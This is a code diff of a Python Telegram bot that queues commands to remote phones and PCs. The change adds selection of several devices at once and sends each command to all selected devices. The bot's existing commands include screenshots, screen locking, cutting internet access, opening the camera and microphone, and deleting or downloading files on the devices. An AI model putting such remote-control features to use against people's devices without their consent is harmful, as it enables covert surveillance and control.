@@ -146,36 +146,76 @@ def device_last_seen_str(device_id: str) -> str:
     return f"{delta} сек назад" if delta < 60 else f"{delta // 60} мин назад"
 
 def selected_device_id(chat_id: str) -> Optional[str]:
-    return state["selected_device"].get(chat_id)
+    sel = state["selected_device"].get(chat_id)
+    # Обратная совместимость: если хранится строка — возвращаем её
+    if isinstance(sel, list):
+        return sel[0] if len(sel) == 1 else None
+    return sel
+
+def selected_device_ids(chat_id: str) -> list[str]:
+    """Возвращает список выбранных device_id для данного chat_id."""
+    sel = state["selected_device"].get(chat_id)
+    if sel is None:
+        return []
+    if sel == "all":
+        return list(devices.keys())
+    if isinstance(sel, list):
+        return [d for d in sel if d in devices]
+    # строка — один ID
+    return [sel] if sel in devices else []
 
 def require_device(chat_id: str):
+    """Возвращает (dev_id, None) или (None, err) — для обратной совместимости.
+    Если выбрано несколько — возвращает первый активный."""
+    ids = require_devices(chat_id)
+    if isinstance(ids, str):
+        return None, ids   # это строка ошибки
+    return ids[0], None
+
+def require_devices(chat_id: str):
+    """Возвращает список device_id или строку с ошибкой."""
     if not devices:
-        return None, "⚠️ Нет подключённых устройств."
-    dev_id = selected_device_id(chat_id)
-    if not dev_id or dev_id not in devices:
+        return "⚠️ Нет подключённых устройств."
+    ids = selected_device_ids(chat_id)
+    if not ids:
         if len(devices) == 1:
             dev_id = next(iter(devices))
             state["selected_device"][chat_id] = dev_id
+            ids = [dev_id]
         else:
-            return None, "⚠️ Выбери устройство командой /devices"
-    if not devices[dev_id]["active"]:
-        return None, "⚠️ Сначала включи режим командой /on"
-    return dev_id, None
+            return "⚠️ Выбери устройство командой /devices"
+    inactive = [i for i in ids if not devices[i]["active"]]
+    active   = [i for i in ids if devices[i]["active"]]
+    if not active:
+        return "⚠️ Сначала включи режим командой /on"
+    return active
 
 # ─── Command queue ────────────────────────────────────────────────────────────
 
 async def enqueue_command(chat_id: str, dev_id: str, cmd: dict, description: str):
+    """Отправить команду на одно устройство."""
+    import copy
     d = devices[dev_id]
     if not device_online(dev_id):
         await send_tg(chat_id,
-            f"⚠️ Телефон оффлайн (ping: {device_last_seen_str(dev_id)})\nКоманда добавлена в очередь.")
+            f"⚠️ Устройство оффлайн (ping: {device_last_seen_str(dev_id)})\nКоманда добавлена в очередь.")
     else:
         await send_tg(chat_id, "📡 Отправляю команду...")
+    cmd_copy = copy.deepcopy(cmd)
     cmd_id = str(uuid.uuid4())[:8]
-    cmd["_id"] = cmd_id
-    d["pending_commands"].append(cmd)
+    cmd_copy["_id"] = cmd_id
+    d["pending_commands"].append(cmd_copy)
     d["command_callbacks"][cmd_id] = chat_id
     await send_tg(chat_id, f"✅ Команда `{description}` в очереди (ID: `{cmd_id}`)")
+
+async def enqueue_multi(chat_id: str, cmd: dict, description: str):
+    """Отправить команду на все выбранные устройства."""
+    ids = require_devices(chat_id)
+    if isinstance(ids, str):
+        await send_tg(chat_id, ids)
+        return
+    for dev_id in ids:
+        await enqueue_command(chat_id, dev_id, cmd, description)
 
 # ─── Keyboards ────────────────────────────────────────────────────────────────
 
@@ -210,12 +250,23 @@ def video_lock_keyboard():
         {"text": "🔒 Заблокировать выход", "callback_data": "vlock_yes"},
     ]]}
 
-def devices_keyboard():
+def devices_keyboard(chat_id: str = ""):
     rows = []
+    selected = state["selected_device"].get(chat_id)
     for dev_id, d in devices.items():
         status = "🟢" if device_online(dev_id) else "🔴"
-        rows.append([{"text": f"{status} {d['model']} ({dev_id[:6]})",
+        if selected == "all":
+            mark = "✓ "
+        elif isinstance(selected, list) and dev_id in selected:
+            mark = "✓ "
+        elif selected == dev_id:
+            mark = "✓ "
+        else:
+            mark = ""
+        rows.append([{"text": f"{mark}{status} {d['model']} ({dev_id[:6]})",
                       "callback_data": f"sel_{dev_id}"}])
+    if len(devices) > 1:
+        rows.append([{"text": "📡 Все устройства", "callback_data": "sel_all"}])
     return {"inline_keyboard": rows}
 
 # ─── Video flow ───────────────────────────────────────────────────────────────
@@ -271,15 +322,51 @@ async def process_callback(callback: dict):
     # ── Выбор устройства ─────────────────────────────────────────────────────
     if data.startswith("sel_"):
         dev_id = data[4:]
+
+        # Выбрать все
+        if dev_id == "all":
+            state["selected_device"][chat_id] = "all"
+            names = ", ".join(d["model"] for d in devices.values())
+            await answer_callback(cb_id, "✅ Все устройства")
+            await send_tg(chat_id,
+                f"📡 Выбраны все устройства: *{names}*",
+                reply_markup=devices_keyboard(chat_id))
+            return
+
         if dev_id not in devices:
             await answer_callback(cb_id, "⚠️ Устройство не найдено")
             return
-        state["selected_device"][chat_id] = dev_id
-        d = devices[dev_id]
-        online = "🟢 онлайн" if device_online(dev_id) else f"🔴 оффлайн"
-        await answer_callback(cb_id, f"✅ {d['model']}")
-        await send_tg(chat_id,
-            f"📱 Выбрано: *{d['model']}*\nID: `{dev_id}`\nСтатус: {online}")
+
+        # Мультивыбор: если уже выбрано одно/несколько — toggle этого девайса
+        current = state["selected_device"].get(chat_id)
+        if current == "all":
+            # Снимаем "все", оставляем только этот
+            selected_list = [dev_id]
+        elif isinstance(current, list):
+            if dev_id in current:
+                selected_list = [d for d in current if d != dev_id] or [dev_id]
+            else:
+                selected_list = current + [dev_id]
+        elif current and current != dev_id:
+            # Был один — добавляем второй
+            selected_list = [current, dev_id]
+        else:
+            selected_list = [dev_id]
+
+        # Если один — храним строкой для совместимости, иначе списком
+        state["selected_device"][chat_id] = selected_list[0] if len(selected_list) == 1 else selected_list
+
+        sel = state["selected_device"][chat_id]
+        if isinstance(sel, list):
+            names = ", ".join(devices[i]["model"] for i in sel if i in devices)
+            text = f"📱 Выбрано {len(sel)} устройства: *{names}*\n\nНажми ещё раз на устройство чтобы снять выбор."
+        else:
+            d = devices[sel]
+            online = "🟢 онлайн" if device_online(sel) else "🔴 оффлайн"
+            text = f"📱 Выбрано: *{d['model']}*\nID: `{sel}`\nСтатус: {online}"
+
+        await answer_callback(cb_id, "✅")
+        await send_tg(chat_id, text, reply_markup=devices_keyboard(chat_id))
         return
 
     # ── Режим сообщения (/msg flow) ───────────────────────────────────────────
@@ -301,7 +388,7 @@ async def process_callback(callback: dict):
             cmd["reply_prompt"] = "✏️ Напиши ответ:"
 
         state["msg_sessions"].pop(chat_id, None)
-        await enqueue_command(chat_id, dev_id, cmd, "сообщение")
+        await enqueue_multi(chat_id, cmd, "сообщение")
         return
 
     # ── Режим видео (fb mode) ─────────────────────────────────────────────────
@@ -455,7 +542,7 @@ async def process_update(update: dict):
         elif vsess["fb_mode"] == "reply":
             cmd["reply_prompt"] = "✏️ Напиши ответ:"
 
-        await enqueue_command(chat_id, dev_id, cmd, desc)
+        await enqueue_multi(chat_id, cmd, desc)
         return
 
     # ── Команды ───────────────────────────────────────────────────────────────
@@ -498,7 +585,7 @@ async def process_update(update: dict):
         cur = selected_device_id(chat_id)
         cur_str = f"Выбрано: *{devices[cur]['model']}*\n\n" if cur and cur in devices else ""
         await send_tg(chat_id, f"📱 *Выбери устройство:*\n{cur_str}",
-                      reply_markup=devices_keyboard())
+                      reply_markup=devices_keyboard(chat_id))
 
     elif text == "/on":
         if not devices:
@@ -544,27 +631,27 @@ async def process_update(update: dict):
     elif text == "/shutdown":
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
-        else: await enqueue_command(chat_id, dev_id, {"cmd": "shutdown"}, "блокировка экрана")
+        else: await enqueue_multi(chat_id, {"cmd": "shutdown"}, "блокировка экрана")
 
     elif text == "/dnd":
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
-        else: await enqueue_command(chat_id, dev_id, {"cmd": "dnd_off"}, "отключить DnD")
+        else: await enqueue_multi(chat_id, {"cmd": "dnd_off"}, "отключить DnD")
 
     elif text == "/ban":
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
-        else: await enqueue_command(chat_id, dev_id, {"cmd": "ban"}, "блок интернета")
+        else: await enqueue_multi(chat_id, {"cmd": "ban"}, "блок интернета")
 
     elif text == "/unban":
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
-        else: await enqueue_command(chat_id, dev_id, {"cmd": "unban"}, "разблок интернета")
+        else: await enqueue_multi(chat_id, {"cmd": "unban"}, "разблок интернета")
 
     elif text == "/screenshot":
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
-        else: await enqueue_command(chat_id, dev_id, {"cmd": "screenshot"}, "скриншот экрана")
+        else: await enqueue_multi(chat_id, {"cmd": "screenshot"}, "скриншот экрана")
 
     elif text.startswith("/msg "):
         dev_id, err = require_device(chat_id)
@@ -592,7 +679,7 @@ async def process_update(update: dict):
                 await send_tg(chat_id, "⚠️ /sound 0-10")
                 return
             level = int(parts[1])
-            await enqueue_command(chat_id, dev_id, {"cmd": "sound", "level": level}, f"громкость {level}/10")
+            await enqueue_multi(chat_id, {"cmd": "sound", "level": level}, f"громкость {level}/10")
 
     elif text.startswith("/addraw "):
         url = text[8:].strip()
@@ -608,7 +695,7 @@ async def process_update(update: dict):
         if err:
             await send_tg(chat_id, err)
             return
-        await enqueue_command(chat_id, dev_id,
+        await enqueue_multi(chat_id,
             {"cmd": "prefetch", "url": url}, "скачать видео")
         await send_tg(chat_id, "📥 Отправлено на скачивание. После завершения появится в /lists.")
 
@@ -617,7 +704,7 @@ async def process_update(update: dict):
         if err:
             await send_tg(chat_id, err)
         else:
-            await enqueue_command(chat_id, dev_id,
+            await enqueue_multi(chat_id,
                 {"cmd": "get_video_list"}, "список видео")
             await send_tg(chat_id, "⏳ Запрашиваю список видео с ПК...")
 
@@ -643,14 +730,14 @@ async def process_update(update: dict):
             await send_tg(chat_id, "⚠️ /delvideo 1")
             return
         num = int(parts[1])
-        await enqueue_command(chat_id, dev_id,
+        await enqueue_multi(chat_id,
             {"cmd": "delete_video", "num": num}, f"удалить видео raw{num}")
         await send_tg(chat_id, f"🗑 Удаляю raw{num} с ПК...")
 
     elif text == "/unbanvideo":
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
-        else: await enqueue_command(chat_id, dev_id, {"cmd": "unban_video"}, "разблок видео")
+        else: await enqueue_multi(chat_id, {"cmd": "unban_video"}, "разблок видео")
 
     elif text.startswith("/name "):
         dev_id, err = require_device(chat_id)
@@ -661,7 +748,7 @@ async def process_update(update: dict):
             if name not in VALID_NAMES:
                 await send_tg(chat_id, f"⚠️ Имена: {', '.join(VALID_NAMES)}")
                 return
-            await enqueue_command(chat_id, dev_id, {"cmd": "rename", "name": name}, f"rename {name}")
+            await enqueue_multi(chat_id, {"cmd": "rename", "name": name}, f"rename {name}")
 
     # ── Опросник ─────────────────────────────────────────────────────────────
     elif text.startswith("/addq "):
@@ -698,12 +785,12 @@ async def process_update(update: dict):
     elif text == "/getfiles":
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
-        else: await enqueue_command(chat_id, dev_id, {"cmd": "open_gallery"}, "открыть галерею")
+        else: await enqueue_multi(chat_id, {"cmd": "open_gallery"}, "открыть галерею")
 
     elif text == "/camera":
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
-        else: await enqueue_command(chat_id, dev_id, {"cmd": "open_camera"}, "открыть камеру")
+        else: await enqueue_multi(chat_id, {"cmd": "open_camera"}, "открыть камеру")
 
     elif text == "/micro":
         dev_id, err = require_device(chat_id)
